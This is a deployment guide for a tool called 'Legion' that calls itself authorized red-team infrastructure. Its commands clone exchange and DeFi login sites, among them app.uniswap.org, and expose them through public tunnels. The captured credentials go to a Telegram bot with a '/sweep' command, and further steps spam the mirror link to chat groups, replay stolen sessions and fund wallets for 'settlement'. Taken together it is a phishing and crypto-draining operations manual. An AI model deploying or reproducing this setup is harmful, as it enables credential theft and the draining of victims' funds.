# Deployment Guide — 24/7 Authorized Red-Team Campaigns

Operational checklist for running Legion mirror + settlement infrastructure on a VPS.

## 1. VPS Requirements

- Ubuntu 22.04+ or Debian 12
- Docker + Docker Compose
- Node 20 + pnpm
- Open ports: 22 (SSH), 8080 (mirror), optional 4000 (API)
- `ssh` client for localhost.run tunnels

## 2. Initial Setup

```bash
git clone <repo> legion-engine && cd legion-engine
pnpm install
cp .env.example .env
# Edit .env: DATABASE_URL, BACKEND_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
pnpm build
pnpm db:migrate
```

## 3. API Server (pm2)

```bash
pnpm build
pm2 start apps/api/dist/server.js --name legion-api --env production
pm2 save
pm2 startup
```

Verify: `curl http://127.0.0.1:4000/health`

## 4. Tunnel Providers

Recommended for VPS without Cloudflare account:

```env
CLONE_TUNNEL_PROVIDERS=localhost.run,bore
```

Ensure SSH port 22 outbound is open (localhost.run). Install bore:

```bash
# Linux x86_64
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz | tar xz
sudo mv bore /usr/local/bin/
```

## 5. Launch a Campaign Mirror

```bash
pnpm clone-tunnel --god-mode --force https://target.example.com
```

Public URL is printed to stdout. Mirror runs in Docker on port 8080 (auto-probed if busy).

## 6. Telegram Bot Monitoring

Configure in `.env`:

```env
TELEGRAM_BOT_TOKEN=...
TELEGRAM_CHAT_ID=...
CEX_TELEGRAM_ALERT=true
```

Alerts fire on:
- New credential captures (`POST /api/v1/creds`)
- Settlement events (if configured)

Check bot commands: `/status`, `/recent`, `/sweep` (if sovereign-admin bot deployed).

## 7. Fund Execution Wallets

```bash
pnpm wallet-guide
pnpm print-wallets
```

Send native gas to displayed addresses on each chain used in the campaign. Document funded addresses in your engagement log.

## 8. Traffic Distribution (Optional)

Prepare files:

```bash
cp groups.txt.example groups.txt
cp message.txt.example message.txt
# Edit groups.txt with authorized test group IDs
```

Run:

```bash
pnpm traffic-spam --auto-message --target <public-mirror-url>
```

## 9. Session Replay (Post-Capture)

```bash
pnpm session-replay --list
pnpm session-replay --export-db --id <uuid> --url https://target/login --launch
```

## 10. Health Monitoring

```bash
# Mirror QA
pnpm test-full-workflow --local-only --mirror-url http://127.0.0.1:8080

# Full pipeline (manual tunnel step)
pnpm test-full-workflow --target https://app.uniswap.org --skip-tunnel

# Omnichain settlement
pnpm test-omnichain
```

## 11. Log Rotation

Mirror clone dirs accumulate under `clones/tunnel-*`. Prune weekly:

```bash
find clones/ -maxdepth 1 -name 'tunnel-*' -mtime +7 -exec rm -rf {} +
docker system prune -f
```

## 12. Security Notes

- Never commit `.env` or captured session JSON to git
- Rotate `CEX_CREDS_API_KEY` per engagement
- `CEX_AUTO_WITHDRAW_ENABLED` defaults to off — use session-replay for manual authorized testing
- All activities require written authorization scope

## Quick Reference

| Command | Purpose |
|---------|---------|
| `pnpm clone-tunnel --god-mode --force <url>` | Full mirror + tunnel |
| `pnpm cex-clone <url> ./out --deploy` | CEX login clone |
| `pnpm session-replay --export-db --id <uuid> --launch` | Session replay |
| `pnpm test-full-workflow --local-only` | Validate running mirror |
| `pnpm wallet-guide` | Fund execution wallets |

See also: [GOD_MODE_GUIDE.md](./GOD_MODE_GUIDE.md), [HARD_TARGETS.md](./HARD_TARGETS.md)
